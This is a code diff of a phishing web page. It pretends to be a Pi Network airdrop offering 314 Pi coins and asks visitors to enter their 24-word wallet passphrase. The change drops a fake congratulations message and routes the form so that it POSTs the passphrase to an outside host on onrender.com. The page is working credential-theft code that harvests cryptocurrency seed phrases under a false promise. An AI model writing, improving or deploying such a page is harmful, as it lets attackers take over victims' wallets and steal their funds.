@@ -5,116 +5,125 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Unlock Pi Reward</title>
     <style>
-        /* Basic Styles */
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+        /* General reset */
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 800px;
-            margin: 50px auto;
-            background-color: white;
+            width: 90%;
+            max-width: 400px;
+            background: white;
             padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-
-        h1, h2, h3 {
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
+        }
+
+        /* Header Styling */
+        .header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 32px;
             font-weight: bold;
+            color: #4A148C;
+            text-shadow: 0px 2px 6px rgba(74, 20, 140, 0.6);
+            animation: fade-in 1.5s ease-in-out;
+            margin-bottom: 8px;
         }
 
-        h1 {
-            color: #ff7b00;
-            font-size: 3rem;
+        .header h2 {
+            font-size: 20px;
+            font-weight: 500;
+            color: #FF6F00;
+            text-shadow: 0px 1px 4px rgba(255, 111, 0, 0.7);
+            margin-bottom: 20px;
         }
 
-        h2 {
-            color: #333;
-            font-size: 1.8rem;
+        @keyframes fade-in {
+            0% {
+                opacity: 0;
+                transform: scale(0.9);
+            }
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
         }
 
+        /* Form Styling */
         h3 {
-            font-size: 1.5rem;
-            color: #444;
+            font-size: 22px;
+            color: #5a2da2;
+            margin-bottom: 20px;
         }
 
         textarea {
             width: 100%;
             height: 100px;
             padding: 10px;
-            font-size: 1rem;
+            font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 4px;
-            margin: 20px 0;
             resize: none;
         }
 
         button {
             width: 100%;
-            padding: 10px;
-            background-color: #ff7b00;
+            background-color: #5a2da2;
             color: white;
             border: none;
+            padding: 12px 20px;
+            font-size: 16px;
             border-radius: 4px;
-            font-size: 1.2rem;
             cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-
-        button:hover {
-            background-color: #ff6000;
-        }
-
-        .congratulations {
-            display: none;
-            text-align: center;
-            background-color: #d4edda;
-            padding: 15px;
-            border-radius: 4px;
             margin-top: 20px;
         }
 
-        .congratulations h4 {
-            color: #155724;
-            font-size: 1.8rem;
+        button:hover {
+            background-color: #4a2390;
         }
 
-        .congratulations p {
-            color: #155724;
-            font-size: 1.2rem;
-        }
-
+        /* Info Text */
         .info-text {
-            margin-top: 30px;
-            font-size: 1rem;
-            text-align: center;
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+            line-height: 1.5;
         }
 
         .info-text a {
-            color: #007bff;
+            color: #5a2da2;
             text-decoration: none;
         }
 
         .info-text a:hover {
             text-decoration: underline;
         }
-
     </style>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script>
         // Clear passphrase on page reload
         window.onload = function() {
             document.getElementById("passphrase").value = "";
         };
 
-        // Show Congratulations message after successful form submission
-        function validatePassphrase(event) {
-            event.preventDefault(); // Prevent default form submission
-            
+        function validatePassphrase() {
             const passphrase = document.getElementById("passphrase").value.trim();
             const wordCount = passphrase.split(" ").filter(word => word).length;
 
@@ -122,23 +131,7 @@
                 alert("Please enter a valid 24-word passphrase.");
                 return false;
             }
-
-            // Send the passphrase to the server
-            $.ajax({
-                url: '/submit',
-                type: 'POST',
-                data: { passphrase: passphrase },
-                success: function(response) {
-                    // On success, show the Congratulations message
-                    document.getElementById("congratulations").style.display = "block";
-                    document.getElementById("passphrase").value = "";
-                },
-                error: function(xhr, status, error) {
-                    alert("There was an error saving the passphrase.");
-                }
-            });
-
-            return false; // Prevent form from submitting normally
+            return true;
         }
     </script>
 </head>
@@ -147,21 +140,15 @@
         <!-- Header Section -->
         <div class="header">
             <h1>Airdrop from Pi Network</h1>
-            <h2>Claim Your 314 PI Coins Now</h2>
+            <h2>Claim Your 314 Pi Coins Now</h2>
         </div>
 
         <!-- Form Section -->
         <h3>Unlock Pi Reward</h3>
-        <form onsubmit="return validatePassphrase(event)">
+        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
             <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
             <button type="submit">Unlock with passphrase</button>
         </form>
-
-        <!-- Congratulations Message -->
-        <div id="congratulations" class="congratulations">
-            <h4>Congratulations!!! You have earned your 314 PI Coins Successfully!</h4>
-            <p>Your 314 PI coins will be in your wallet within 24hrs.</p>
-        </div>
 
         <!-- Info Section -->
         <div class="info-text">
